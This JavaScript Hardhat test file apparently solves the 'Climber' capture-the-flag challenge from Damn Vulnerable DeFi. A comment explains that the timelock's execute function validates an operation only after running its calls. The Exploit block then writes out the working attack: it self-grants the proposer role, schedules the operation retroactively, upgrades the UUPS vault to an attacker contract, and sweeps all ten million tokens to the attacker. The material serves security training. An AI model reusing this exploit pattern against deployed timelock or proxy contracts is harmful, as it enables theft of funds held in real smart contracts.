const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** EXPLOIT
            The vulnerability lies in the ClimberTimelock contract, in the 'execute' function which checks the status of the operation AFTER the call.
            This allows an attacker to make any function call to other contracts with the 'identity' (i.e. msg.sender) of the timelock contract.
            This can be exploited to essentially break the scheduling funtionnalty has calls can be scheduled retrospectively.

            Since the timelock contract is an Admin of itself AND owner of the ClimberVault, we can use thoses roles to sweep all tokens in the vault in the following manner:
                1. Grant a "PROPOSER" role to a custom contract and use the new role to schedule the call itself, validating the operation.
                2. Schedule a call to upgrade the vault and call 'setSweeper' with the attacker's address.
                3. Execute the call
                4. Sweep funds
                5. ???
                6. Profit
        */
        let salt = "0x" + "00".repeat(32);
        this.exploit = await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy(this.timelock.address);
        await this.timelock.execute(
            [this.timelock.address, this.exploit.address], // Targets
            [0, 0], // Values (unused)
            [
                this.timelock.interface.encodeFunctionData("grantRole", [await this.timelock.PROPOSER_ROLE(), this.exploit.address]), // First function call grants "PROPOSER" role to our exploit contract
                this.exploit.interface.encodeFunctionData("scheduleProposerRole") // Second function call enables exploit contract to schedule this 'execute' transaction
            ],
            salt // Not forgetting salt (unused)
        );

        // Since timelock contract is owner, we can trigger an upgrade to our exploit contract through an 'execute' call
        let sweepParameters = [[this.vault.address], [0], [this.vault.interface.encodeFunctionData("upgradeToAndCall", [
            this.exploit.address,
            this.exploit.interface.encodeFunctionData("setSweeper", [attacker.address])
            ])]
        ];
        await this.exploit.schedule(...sweepParameters); // Since the exploit contract is now a 'PROPOSER' we can schedule this execute call
        await this.timelock.execute(...sweepParameters, salt); // Execute it
        await (await this.vault.connect(attacker)).sweepFunds(this.token.address); // Sweep all tokens !
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
